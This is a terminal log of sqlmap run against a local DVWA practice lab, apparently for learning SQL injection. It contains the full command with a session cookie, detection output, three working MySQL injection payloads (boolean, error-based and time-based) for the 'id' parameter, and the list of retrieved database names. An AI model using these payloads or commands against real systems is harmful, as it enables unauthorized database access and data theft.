 $ sqlmap --url="http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=tnusaaspju33gd737338bcnhrl; security=low" --data="id=1&Submit=Submit" -p id --dbs
         ___
     __H__
 ___ ___[.]_____ ___ ___  {1.7.12#stable}
 |_ -| . [']     | .'| . |
 |___|_  [(]_|_|_|__,|  _|
     |_|V...       |_|   https://sqlmap.org

 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

 [*] starting @ 10:17:13 /2023-12-14/

 [10:17:13] [INFO] testing connection to the target URL
 [10:17:13] [INFO] checking if the target is protected by some kind of WAF/IPS
 [10:17:13] [INFO] testing if the target URL content is stable
 [10:17:14] [INFO] target URL content is stable
 [10:17:14] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
 [10:17:14] [INFO] testing for SQL injection on POST parameter 'id'
 [10:17:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 [10:17:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
 [10:17:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
 [10:17:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
 [10:17:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
 [10:17:14] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
 [10:17:14] [INFO] testing 'Generic inline queries'
 [10:17:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
 [10:17:14] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
 [10:17:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
 [10:17:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
 [10:17:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
 [10:17:14] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
 [10:17:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
 [10:17:14] [INFO] testing 'Oracle AND time-based blind'
 it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
 [10:17:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
 [10:17:28] [WARNING] POST parameter 'id' does not seem to be injectable
 [10:17:28] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
 [10:17:28] [INFO] testing for SQL injection on GET parameter 'id'
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
 [10:17:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 [10:17:45] [WARNING] reflective value(s) found and filtering out
 [10:17:45] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
 [10:17:45] [INFO] testing 'Generic inline queries'
 [10:17:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
 [10:17:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
 [10:17:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
 [10:17:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
 [10:17:45] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
 [10:17:45] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
 [10:17:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
 [10:17:45] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
 [10:17:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
 [10:17:45] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
 [10:17:45] [INFO] testing 'MySQL inline queries'
 [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
 [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
 [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
 [10:17:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
 [10:17:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
 [10:17:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
 [10:17:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
 [10:17:55] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
 [10:17:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
 [10:17:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
 [10:17:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
 [10:17:55] [INFO] target URL appears to have 2 columns in query
 do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
 injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
 [10:18:01] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
 [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
 [10:18:01] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
 sqlmap identified the following injection point(s) with a total of 352 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
     Payload: id=1' AND 2879=2879 AND 'FGUV'='FGUV&Submit=Submit

     Type: error-based
     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
     Payload: id=1' AND (SELECT 5082 FROM(SELECT COUNT(*),CONCAT(0x716b627071,(SELECT (ELT(5082=5082,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VSXt'='VSXt&Submit=Submit

     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: id=1' AND (SELECT 9523 FROM (SELECT(SLEEP(5)))RuBI) AND 'DZYn'='DZYn&Submit=Submit
 ---
 [10:18:03] [INFO] the back-end DBMS is MySQL
 web application technology: Nginx 1.24.0
 back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [10:18:03] [INFO] fetching database names
 [10:18:03] [INFO] retrieved: 'information_schema'
 [10:18:03] [INFO] retrieved: 'dvwa'
 available databases [2]:
 [*] dvwa
 [*] information_schema

 [10:18:03] [WARNING] HTTP error codes detected during run:
 404 (Not Found) - 5 times
 [10:18:03] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

 [*] ending @ 10:18:03 /2023-12-14/
